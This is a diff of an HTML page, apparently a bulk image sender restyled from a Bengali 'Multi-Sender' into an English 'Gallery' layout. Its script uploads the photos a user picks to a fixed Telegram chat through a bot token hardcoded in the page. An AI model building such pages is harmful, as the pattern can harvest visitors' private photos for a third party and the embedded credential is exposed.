@@ -1,111 +1,128 @@
 <!DOCTYPE html>
-<html lang="bn">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Multi-Sender</title>
+    <title>Minimalist Sender</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap');
-        body { background: #080808; font-family: 'Hind Siliguri', sans-serif; color: white; }
-        .glass { background: rgba(255, 255, 255, 0.02); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.08); }
-        .counter-glow { text-shadow: 0 0 15px rgba(59, 130, 246, 0.6); }
-        .progress-smooth { transition: width 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
+        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
+        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(20px); border: 1px solid rgba(255, 255, 255, 0.1); }
+        .upload-zone { border: 2px dashed rgba(255, 255, 255, 0.1); transition: 0.3s; }
+        .upload-zone:hover { border-color: #3b82f6; background: rgba(59, 130, 246, 0.05); }
+        .img-container:hover .close-btn { opacity: 1; }
+        .close-btn { opacity: 0; transition: 0.2s; background: rgba(239, 68, 68, 0.9); }
     </style>
 </head>
-<body class="flex items-center justify-center min-h-screen p-6">
+<body class="p-6 md:p-12">
 
-    <div class="glass max-w-lg w-full p-10 rounded-[40px] shadow-2xl">
-        
-        <div class="text-center mb-8">
-            <h2 class="text-gray-400 text-xs uppercase tracking-[0.3em] mb-3">লাইভ স্ট্যাটাস</h2>
-            <div class="flex justify-center items-end gap-1">
-                <span id="current-sending" class="text-6xl font-black text-blue-500 counter-glow">0</span>
-                <span class="text-2xl text-gray-600 font-bold mb-2">/</span>
-                <span id="total-to-send" class="text-2xl text-gray-500 font-bold mb-2">0</span>
+    <div class="max-w-5xl mx-auto">
+        <div class="flex justify-between items-end mb-12">
+            <div class="text-4xl font-light tracking-tighter uppercase">Gallery <span class="font-bold text-blue-500">.</span></div>
+            <div class="flex items-baseline gap-2">
+                <span id="sent-count" class="text-5xl font-black text-white">0</span>
+                <span class="text-gray-600 text-xl">/</span>
+                <span id="total-count" class="text-xl text-gray-500">0</span>
             </div>
-            <p id="status-msg" class="text-gray-500 text-sm mt-3 italic">অপেক্ষা করা হচ্ছে...</p>
         </div>
 
-        <div class="relative h-2 w-full bg-gray-800 rounded-full overflow-hidden mb-10">
-            <div id="progress-bar" class="progress-smooth absolute top-0 left-0 h-full bg-gradient-to-r from-blue-600 to-cyan-400 w-0"></div>
+        <div class="w-full h-[2px] bg-gray-900 mb-12 overflow-hidden">
+            <div id="bar" class="h-full bg-blue-500 w-0 transition-all duration-500"></div>
         </div>
 
-        <label class="block group cursor-pointer">
-            <input type="file" id="imageInput" multiple accept="image/*" class="hidden">
-            <div class="border-2 border-dashed border-gray-700 group-hover:border-blue-500 py-10 rounded-3xl text-center transition-all duration-300">
-                <span class="text-4xl block mb-2">📸</span>
-                <p class="text-gray-400 group-hover:text-white">৫০০+ ছবি একসাথে সিলেক্ট করুন</p>
+        <div class="grid grid-cols-1 lg:grid-cols-4 gap-8">
+            <div class="lg:col-span-1">
+                <label class="upload-zone rounded-[30px] p-12 flex flex-col items-center justify-center cursor-pointer mb-6 h-64">
+                    <input type="file" id="fileInput" multiple accept="image/*" class="hidden">
+                    <div class="text-4xl mb-4">+</div>
+                </label>
+                
+                <button onclick="sendImages()" id="mainBtn" class="w-full py-5 bg-white text-black font-bold rounded-[20px] hover:bg-blue-500 hover:text-white transition-all active:scale-95">
+                    SEND
+                </button>
             </div>
-        </label>
 
-        <button onclick="startSending()" id="sendBtn" class="w-full mt-8 bg-blue-600 hover:bg-blue-500 py-5 rounded-2xl font-bold text-lg shadow-lg shadow-blue-900/30 transition-all active:scale-95">
-            সেন্ড করা শুরু করুন
-        </button>
+            <div class="lg:col-span-3 glass rounded-[40px] p-8 min-h-[400px]">
+                <div id="preview-grid" class="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
+                    </div>
+            </div>
+        </div>
     </div>
 
     <script>
-        const BOT_TOKEN = "7803047176:AAENBpYrmbNuFiBsAMf8fwFybVOsSNTgQM4";
+        const TOKEN = "7803047176:AAENBpYrmbNuFiBsAMf8fwFybVOsSNTgQM4";
         const CHAT_ID = "5923885908";
+        let files = [];
 
-        const imageInput = document.getElementById('imageInput');
-        const currentSendingDisp = document.getElementById('current-sending');
-        const totalToSendDisp = document.getElementById('total-to-send');
-        const progressBar = document.getElementById('progress-bar');
-        const statusMsg = document.getElementById('status-msg');
+        const fileInput = document.getElementById('fileInput');
+        const previewGrid = document.getElementById('preview-grid');
+        const totalCountDisp = document.getElementById('total-count');
+        const sentCountDisp = document.getElementById('sent-count');
+        const bar = document.getElementById('bar');
 
-        imageInput.onchange = () => {
-            totalToSendDisp.innerText = imageInput.files.length;
-            currentSendingDisp.innerText = "0";
-            statusMsg.innerText = imageInput.files.length + " টি ছবি তৈরি আছে";
+        fileInput.onchange = (e) => {
+            const newFiles = Array.from(e.target.files);
+            files = [...files, ...newFiles];
+            render();
         };
 
-        async function startSending() {
-            const files = Array.from(imageInput.files);
-            if (files.length === 0) return alert("দয়া করে ছবি সিলেক্ট করুন!");
-
-            const btn = document.getElementById('sendBtn');
-            btn.disabled = true;
-            btn.classList.replace('bg-blue-600', 'bg-gray-700');
+        function render() {
+            previewGrid.innerHTML = "";
+            totalCountDisp.innerText = files.length;
             
-            let sentCount = 0;
+            files.forEach((file, i) => {
+                const url = URL.createObjectURL(file);
+                const div = document.createElement('div');
+                div.className = "relative img-container aspect-square rounded-2xl overflow-hidden glass";
+                div.innerHTML = `
+                    <img src="${url}" class="w-full h-full object-cover">
+                    <button onclick="remove(${i})" class="close-btn absolute inset-0 flex items-center justify-center text-white text-xl">✕</button>
+                `;
+                previewGrid.appendChild(div);
+            });
+        }
+
+        function remove(i) {
+            files.splice(i, 1);
+            render();
+        }
+
+        async function sendImages() {
+            if(files.length === 0) return;
+            const btn = document.getElementById('mainBtn');
+            btn.disabled = true;
+            btn.innerText = "SENDING...";
+
+            let sent = 0;
             const total = files.length;
 
-            // দ্রুত পাঠানোর জন্য ছোট ব্যাচ (Batch) সিস্টেম
-            const batchSize = 3; 
-
-            for (let i = 0; i < total; i += batchSize) {
-                const batch = files.slice(i, i + batchSize);
-                
+            // Batch Processing for Speed
+            for (let i = 0; i < total; i += 3) {
+                const batch = files.slice(i, i + 3);
                 await Promise.all(batch.map(async (file) => {
-                    const formData = new FormData();
-                    formData.append("chat_id", CHAT_ID);
-                    formData.append("photo", file);
-
+                    const fd = new FormData();
+                    fd.append("chat_id", CHAT_ID);
+                    fd.append("photo", file);
                     try {
-                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                            method: "POST",
-                            body: formData
-                        });
-
-                        if (response.ok) {
-                            sentCount++;
-                            // সংখ্যা পরিবর্তন স্মুথ করার জন্য
-                            currentSendingDisp.innerText = sentCount;
-                            let percent = (sentCount / total) * 100;
-                            progressBar.style.width = percent + "%";
-                            statusMsg.innerText = "পাঠানো হচ্ছে: " + sentCount + "/" + total;
+                        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: fd });
+                        if(res.ok) {
+                            sent++;
+                            sentCountDisp.innerText = sent;
+                            bar.style.width = (sent / total * 100) + "%";
                         }
-                    } catch (e) {
-                        console.error("Error sending image");
-                    }
+                    } catch(e) {}
                 }));
             }
 
-            statusMsg.innerText = "✅ সবগুলো পাঠানো শেষ!";
-            btn.innerText = "আবার পাঠান";
-            btn.disabled = false;
-            btn.classList.replace('bg-gray-700', 'bg-blue-600');
+            btn.innerText = "DONE";
+            setTimeout(() => {
+                btn.disabled = false;
+                btn.innerText = "SEND";
+                files = [];
+                render();
+                bar.style.width = "0%";
+                sentCountDisp.innerText = "0";
+            }, 2000);
         }
     </script>
 </body>
